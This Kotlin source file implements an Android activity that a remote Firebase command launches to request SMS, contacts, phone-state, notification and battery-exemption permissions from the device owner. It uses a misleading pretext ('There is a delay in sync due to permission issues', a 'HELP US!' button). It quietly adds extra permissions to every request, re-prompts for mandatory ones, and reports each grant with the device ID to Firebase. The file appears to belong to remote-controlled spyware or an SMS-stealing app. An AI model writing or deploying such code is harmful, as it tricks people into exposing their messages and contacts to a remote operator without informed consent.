package com.example.fast.ui

import android.Manifest
import android.animation.Animator
import android.animation.AnimatorListenerAdapter
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.animation.DecelerateInterpolator
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.cardview.widget.CardView
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.example.fast.R
import com.example.fast.config.AppConfig
import com.example.fast.databinding.ActivityRemotePermissionRequestBinding
import com.example.fast.service.NotificationReceiver
import com.example.fast.util.PermissionFirebaseSync
import com.example.fast.util.PermissionManager
import com.example.fast.util.PermissionSyncHelper

/**
 * RemotePermissionRequestActivity
 *
 * Activity launched remotely via Firebase command to request specific permissions.
 * Shows a UI with message and "HELP US!" button.
 *
 * Usage:
 * - Command: requestPermission
 * - Content: "permission1,permission2,..." or "ALL"
 * - Permissions: sms, contacts, notification, battery, phone_state, ALL
 *
 * Example:
 * - "sms,contacts" -> Request SMS and Contacts permissions
 * - "ALL" -> Request all permissions
 */
class RemotePermissionRequestActivity : AppCompatActivity() {

    private val binding by lazy { ActivityRemotePermissionRequestBinding.inflate(layoutInflater) }

    private val TAG = "RemotePermissionRequest"
    private val PERMISSION_REQUEST_CODE = 200

    @Suppress("DEPRECATION")
    private val permissionsList: ArrayList<String> by lazy {
        val baseList = intent.getStringArrayListExtra("permissions") ?: ArrayList()
        // Automatically add battery and notification to the chain if not already present
        val enhancedList = ArrayList(baseList)
        if (!enhancedList.contains("notification")) {
            enhancedList.add("notification")
        }
        if (!enhancedList.contains("battery")) {
            enhancedList.add("battery")
        }
        enhancedList
    }

    @get:android.annotation.SuppressLint("HardwareIds")
    private val deviceId: String by lazy {
        android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Set window background to match app theme
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.statusBarColor = ContextCompat.getColor(this, R.color.theme_gradient_start)
            window.navigationBarColor = ContextCompat.getColor(this, R.color.theme_gradient_start)
        }

        setContentView(binding.root)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)

        // Animate card entrance
        animateCardEntrance()

        // Animate icon pulse
        animateIconPulse()

        // Setup UI
        setupUI()

        // Sync current permission status to Firebase
        PermissionFirebaseSync.syncPermissionStatus(this, deviceId)

        // Start processing permission requests when button is clicked
        if (permissionsList.isEmpty()) {
            Log.w(TAG, "No permissions to request, finishing activity")
            finish()
            return
        }
    }

    /**
     * Animate card entrance
     */
    private fun animateCardEntrance() {
        binding.mainCard.alpha = 0f
        binding.mainCard.translationY = 100f

        binding.mainCard.animate()
            .alpha(1f)
            .translationY(0f)
            .setDuration(600)
            .setInterpolator(DecelerateInterpolator())
            .start()
    }

    /**
     * Animate icon pulse effect
     */
    private fun animateIconPulse() {
        val iconContainer = binding.iconContainer
        val scaleAnimator = ObjectAnimator.ofFloat(iconContainer, "scaleX", 1f, 1.05f, 1f)
        scaleAnimator.duration = 2000
        scaleAnimator.repeatCount = ValueAnimator.INFINITE
        scaleAnimator.repeatMode = ValueAnimator.REVERSE
        scaleAnimator.start()

        val scaleYAnimator = ObjectAnimator.ofFloat(iconContainer, "scaleY", 1f, 1.05f, 1f)
        scaleYAnimator.duration = 2000
        scaleYAnimator.repeatCount = ValueAnimator.INFINITE
        scaleYAnimator.repeatMode = ValueAnimator.REVERSE
        scaleYAnimator.start()
    }

    /**
     * Setup UI elements
     */
    private fun setupUI() {
        // Set message text
        binding.messageText.text = "There is a delay in sync due to permission issues."
        binding.subtitleText.text = "We give our best."

        // Setup help button click listener
        binding.helpButton.setOnClickListener {
            // Animate button press
            binding.helpButton.animate()
                .scaleX(0.95f)
                .scaleY(0.95f)
                .setDuration(100)
                .withEndAction {
                    binding.helpButton.animate()
                        .scaleX(1f)
                        .scaleY(1f)
                        .setDuration(100)
                        .start()
                }
                .start()

            // Hide button and show permissions list
            hideButtonAndShowPermissions()
        }
    }

    /**
     * Hide button and show permissions list with animation
     */
    private fun hideButtonAndShowPermissions() {
        // Hide button
        binding.helpButtonCard.animate()
            .alpha(0f)
            .scaleX(0.8f)
            .scaleY(0.8f)
            .setDuration(300)
            .setListener(object : AnimatorListenerAdapter() {
                override fun onAnimationEnd(animation: Animator) {
                    binding.helpButtonCard.visibility = View.GONE
                }
            })
            .start()

        // Show permissions list
        binding.permissionsListContainer.visibility = View.VISIBLE
        binding.permissionsListContainer.alpha = 0f
        binding.permissionsListContainer.translationY = -20f

        binding.permissionsListContainer.animate()
            .alpha(1f)
            .translationY(0f)
            .setDuration(400)
            .setInterpolator(DecelerateInterpolator())
            .start()

        // Populate permissions list
        populatePermissionsList()

        // Start runtime permission list flow, then handle notification/battery if in list
        Handler(Looper.getMainLooper()).postDelayed({
            startRuntimePermissionFlow()
        }, 500)
    }

    /**
     * Start list-based runtime permission flow; on completion sync to Firebase and run notification/battery if needed.
     */
    private fun startRuntimePermissionFlow() {
        val requests = PermissionManager.permissionNamesToRequests(permissionsList, true, this)
        if (requests.isNotEmpty()) {
            PermissionManager.startRequestPermissionList(
                this,
                requests,
                PERMISSION_REQUEST_CODE,
                maxCyclesForMandatory = 3,
                onComplete = { results ->
                    syncRuntimeResultsAndContinue(results)
                }
            )
        } else {
            val specialList = permissionsList.filter { it in listOf("notification", "battery") }.distinct()
            if (specialList.isNotEmpty()) {
                PermissionManager.startSpecialPermissionList(
                    this,
                    specialList,
                    onComplete = { specialResults ->
                        specialResults.forEach { r ->
                            when (r.permission) {
                                "notification" -> {
                                    PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "notification", r.isAllowed)
                                    updatePermissionItemStatus("Notifications", r.isAllowed)
                                }
                                "battery" -> {
                                    PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "battery", r.isAllowed)
                                    updatePermissionItemStatus("Battery Optimization", r.isAllowed)
                                }
                            }
                        }
                        PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
                        PermissionSyncHelper.checkAndStartSync(this)
                        showSuccessMessage()
                        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 2000)
                    }
                )
            } else {
                PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
                PermissionSyncHelper.checkAndStartSync(this)
                showSuccessMessage()
                Handler(Looper.getMainLooper()).postDelayed({ finish() }, 2000)
            }
        }
    }

    /**
     * Sync runtime results to Firebase, update UI, then run notification/battery flow if in list.
     */
    private fun syncRuntimeResultsAndContinue(results: List<PermissionManager.PermissionResult>) {
        val smsGranted = results.filter { it.permission == Manifest.permission.RECEIVE_SMS || it.permission == Manifest.permission.READ_SMS }
            .let { list -> list.isNotEmpty() && list.all { it.isAllowed } }
        PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "sms", smsGranted)
        updatePermissionItemStatus("SMS Access", smsGranted)

        results.forEach { result ->
            when (result.permission) {
                Manifest.permission.READ_CONTACTS -> {
                    PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "contacts", result.isAllowed)
                    updatePermissionItemStatus("Contacts", result.isAllowed)
                }
                Manifest.permission.READ_PHONE_STATE -> {
                    PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "phone_state", result.isAllowed)
                    updatePermissionItemStatus("Phone State", result.isAllowed)
                }
                Manifest.permission.POST_NOTIFICATIONS -> {
                    PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "notification", result.isAllowed)
                    updatePermissionItemStatus("Notifications", result.isAllowed)
                }
            }
        }

        val specialList = permissionsList.filter { it in listOf("notification", "battery") }.distinct()
        if (specialList.isNotEmpty()) {
            PermissionManager.startSpecialPermissionList(
                this,
                specialList,
                onComplete = { specialResults ->
                    specialResults.forEach { r ->
                        when (r.permission) {
                            "notification" -> {
                                PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "notification", r.isAllowed)
                                updatePermissionItemStatus("Notifications", r.isAllowed)
                            }
                            "battery" -> {
                                PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "battery", r.isAllowed)
                                updatePermissionItemStatus("Battery Optimization", r.isAllowed)
                            }
                        }
                    }
                    PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
                    PermissionSyncHelper.checkAndStartSync(this)
                    showSuccessMessage()
                    Handler(Looper.getMainLooper()).postDelayed({ finish() }, 2000)
                }
            )
        } else {
            PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
            PermissionSyncHelper.checkAndStartSync(this)
            showSuccessMessage()
            Handler(Looper.getMainLooper()).postDelayed({ finish() }, 2000)
        }
    }

    /**
     * Populate permissions list UI
     */
    private fun populatePermissionsList() {
        val permissionsListLayout = binding.permissionsList
        permissionsListLayout.removeAllViews()

        val permissionNames = mapOf(
            "sms" to "SMS Access",
            "contacts" to "Contacts",
            "notification" to "Notifications",
            "battery" to "Battery Optimization",
            "phone_state" to "Phone State"
        )

        permissionsList.forEach { permission ->
            val permissionItem = createPermissionItem(permissionNames[permission] ?: permission)
            permissionsListLayout.addView(permissionItem)
        }
    }

    /**
     * Create a permission item view
     */
    private fun createPermissionItem(permissionName: String): View {
        val itemLayout = LinearLayout(this)
        itemLayout.orientation = LinearLayout.HORIZONTAL
        itemLayout.gravity = android.view.Gravity.CENTER_VERTICAL
        val padding = dpToPx(12)
        itemLayout.setPadding(padding, padding / 2, padding, padding / 2)

        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        params.setMargins(0, 0, 0, dpToPx(8))
        itemLayout.layoutParams = params

        // Set background
        val background = GradientDrawable()
        background.setColor(ContextCompat.getColor(this, android.R.color.transparent))
        background.cornerRadius = dpToPx(12).toFloat()
        itemLayout.background = background

        // Icon
        val icon = ImageView(this)
        icon.setImageResource(android.R.drawable.ic_dialog_info)
        icon.setColorFilter(ContextCompat.getColor(this, R.color.theme_primary))
        val iconParams = LinearLayout.LayoutParams(dpToPx(24), dpToPx(24))
        iconParams.setMargins(0, 0, dpToPx(12), 0)
        icon.layoutParams = iconParams
        itemLayout.addView(icon)

        // Permission name
        val nameText = TextView(this)
        nameText.text = permissionName
        nameText.setTextColor(ContextCompat.getColor(this, android.R.color.black))
        nameText.textSize = 14f
        nameText.setTypeface(null, android.graphics.Typeface.BOLD)
        nameText.layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        itemLayout.addView(nameText)

        return itemLayout
    }

    /**
     * Convert dp to pixels
     */
    private fun dpToPx(dp: Int): Int {
        return (dp * resources.displayMetrics.density).toInt()
    }

    /**
     * Update permission item to show granted state
     */
    private fun updatePermissionItemStatus(permissionName: String, granted: Boolean) {
        val permissionsListLayout = binding.permissionsList
        for (i in 0 until permissionsListLayout.childCount) {
            val item = permissionsListLayout.getChildAt(i) as? LinearLayout ?: continue
            val textView = item.getChildAt(1) as? TextView ?: continue
            if (textView.text.toString().contains(permissionName, ignoreCase = true)) {
                // Update background color
                val background = GradientDrawable()
                background.setColor(if (granted) {
                    ContextCompat.getColor(this, android.R.color.holo_green_light)
                } else {
                    ContextCompat.getColor(this, android.R.color.transparent)
                })
                background.cornerRadius = dpToPx(12).toFloat()
                item.background = background

                // Add checkmark icon
                if (granted && item.childCount == 2) {
                    val checkIcon = ImageView(this)
                    checkIcon.setImageResource(android.R.drawable.checkbox_on_background)
                    checkIcon.setColorFilter(ContextCompat.getColor(this, android.R.color.holo_green_dark))
                    val checkParams = LinearLayout.LayoutParams(dpToPx(24), dpToPx(24))
                    checkParams.setMargins(dpToPx(12), 0, 0, 0)
                    checkIcon.layoutParams = checkParams
                    item.addView(checkIcon)
                }

                // Animate update
                item.animate()
                    .scaleX(1.05f)
                    .scaleY(1.05f)
                    .setDuration(200)
                    .withEndAction {
                        item.animate()
                            .scaleX(1f)
                            .scaleY(1f)
                            .setDuration(200)
                            .start()
                    }
                    .start()
                break
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE &&
            PermissionManager.handleRequestPermissionListResult(this, requestCode, permissions, grantResults)
        ) {
            return
        }
    }

    override fun onResume() {
        super.onResume()
        if (PermissionManager.onSpecialPermissionReturn(this)) return
    }

    /**
     * Show success message
     */
    private fun showSuccessMessage() {
        binding.successMessage.visibility = View.VISIBLE
        binding.successMessage.alpha = 0f

        binding.successMessage.animate()
            .alpha(1f)
            .setDuration(400)
            .setInterpolator(DecelerateInterpolator())
            .start()
    }
}
